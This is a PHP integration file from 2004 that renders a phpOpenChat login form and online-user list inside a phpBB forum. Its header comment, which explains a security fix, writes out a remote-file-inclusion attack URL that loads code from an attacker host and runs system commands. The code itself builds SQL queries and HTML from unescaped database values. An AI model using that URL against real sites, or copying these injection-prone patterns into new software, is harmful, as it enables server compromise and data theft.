<?php
/***************************************************************************
 *                                 poc_loginform.php
 *                            -------------------
 *   copyright            : (C) 2004 byThomas Schwenke
 *   email                : poc@thomasschwenke.de
 *
 *                           visit: http://phpopenchat.org/
 *
 ***************************************************************************/

/***************************************************************************
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 ***************************************************************************/
//quick security fix
//'cause, if register_globals=on and allow_url_fopen=on
//the following is possible:
//http://www.victime.al/phpopenchat/contrib/phpbb/poc.php?phpbb_root_path=http://www.haxorz.al/asc?&cmd=uname%20-a;w;id;pwd;ps
//thx to the Albania Security Clan (Mafia_Boy) 
//for finding the bug and bringing us to the light!

if( !function_exists('version_compare') || version_compare(PHP_VERSION, "4.1.0", "<") )
  die('please update your php installation');

$givenParams = array_keys($_REQUEST);
foreach($givenParams as $param )
  unset(${$param});

//------------------------------------ please modify the variables below
// enter the relative path to your phpOpenchat folder without a slash at the end. Example: $poc_path="../phpopenchat";
$poc_path="../phpopenchat";
//allow Guestlogin?  1=yes, 0=no
$guestlogin=1;

//----------------------------------- do not change the code below
define('IN_PHPBB', true);
$phpbb_root_path = './';
include($phpbb_root_path . 'extension.inc');
include($phpbb_root_path . 'common.'.$phpEx);
include($phpbb_root_path . 'language/lang_' . $board_config['default_lang'] . '/lang_main.' . $phpEx);

//
// Start session management
//
$userdata = session_pagestart($user_ip, PAGE_INDEX);
init_userprefs($userdata);
//
// End session management
//

// Check whether the user is logged in
if (!$userdata['session_logged_in']) {
    $template->assign_block_vars('notlogged_switch', array());
}
else {
    $sid=$userdata['session_id'];
    $template->assign_block_vars('logged_switch', array());
}
	
	
// Show Channels
$result = @mysql_query("select NAME, MAX_LINE_NUMBER, TYPE from poc_channels WHERE TYPE<='1' ORDER by TYPE, ORDER_IDX"); 
while ($row = @mysql_fetch_array($result)){ 
    $resultchannel = @mysql_query("select * from poc_user_data WHERE LAST_CHANNEL ='$row[NAME]' AND ONLINE='1'"); 
    $numchatter= mysql_num_rows($resultchannel);
    if(($row[TYPE]==0)and(!$pubset)) {
	    $poc_channels.="<optgroup label=\"".$lang['POC_PUBLIC']."\">";
	    $pubset=TRUE;
    }
    else if(($row[TYPE]==1)and(!$modset)) {
	    $poc_channels.="</optgroup>\n<optgroup label=\"".$lang['POC_MODERATED']."\">\n";
	    $modset=TRUE;
    }
    if(!$firstchannel) {
	$firstchannel=$row[NAME];
    }
    $poc_channels.="<option value='$row[NAME]'>$row[NAME] ($numchatter/$row[MAX_LINE_NUMBER])</option>\n";
}
$poc_channels.="</optgroup>\n";

//Guest link
if($guestlogin==1) {
    $poc_guestlogin="<a href=\"javascript:document.g.submit();\">".$lang['POC_guest']."</a>";
    } else {
    $poc_guestlogin="";
    }

$poc_guestaction="$poc_path/index.php?channel=$firstchannel";

//Show Users online
$result = @mysql_query("select NAME from poc_channels ORDER by ORDER_IDX"); 
while ($row = @mysql_fetch_array($result)){ 
    
    $resultchatter = @mysql_query("select NICK from poc_user_data WHERE LAST_CHANNEL='$row[NAME]' and ONLINE='1' ORDER by NICK"); 
    $numofchatters = mysql_num_rows($resultchatter);    
    while ($rowchatter = @mysql_fetch_array($resultchatter)){
	 $resultchatterid = @mysql_query("select user_id from ". USERS_TABLE ." WHERE username='$rowchatter[NICK]'");
	  while ($rowchatterid = @mysql_fetch_array($resultchatterid)){
		$poc_showusersonline_temp.="<a href=\"profile.$phpEx?mode=viewprofile&u=".$rowchatterid[user_id]."\">".$rowchatter[NICK]."</a>, ";
	    }  	
    }
    if($poc_showusersonline_temp) {
        $poc_showusersonline_temp=substr($poc_showusersonline_temp,0,-2); //delete the last comma
        $poc_showusersonline.="<b>$row[NAME]($numofchatters) :</b> $poc_showusersonline_temp<br>";
    }
    unset($poc_showusersonline_temp);
}
    if(!$poc_showusersonline) {
	$poc_showusersonline=$lang['POC_NOUSERSONLINE'];
    }


//header and Template parsing

include($phpbb_root_path . 'includes/page_header.'.$phpEx);
	$template->set_filenames(array(
		'body' => 'poc_loginform_body.tpl')
	);

	$template->assign_vars(array(
		
		'POC_CHANNEL' => $poc_channels,
		'POC_USERNAME' => $userdata[2],
		'POC_GUEST' => $poc_guestlogin,
		'POC_GUEST_ACTION' => $poc_guestaction,
		'POC_SHOWUSERSONLINE' => $poc_showusersonline,
		
		'L_POC_USERSONLINE' =>$lang['POC_USERSONLINE'],
		'L_POC_CHANNEL' => $lang['POC_channel'],
		'L_SUBMIT' => $lang['Submit'],
		'L_USERNAME' => $lang['Username'],
		'L_PASSWORD' => $lang['Password'],
		'L_AUTO_LOGIN' => $lang['Log_me_in'],
		'L_POC_TITLE' => $lang['POC_TITLE'],
				    ));


//Template and page_tail output
$template->pparse('body');
include($phpbb_root_path . 'includes/page_tail.'.$phpEx);
?>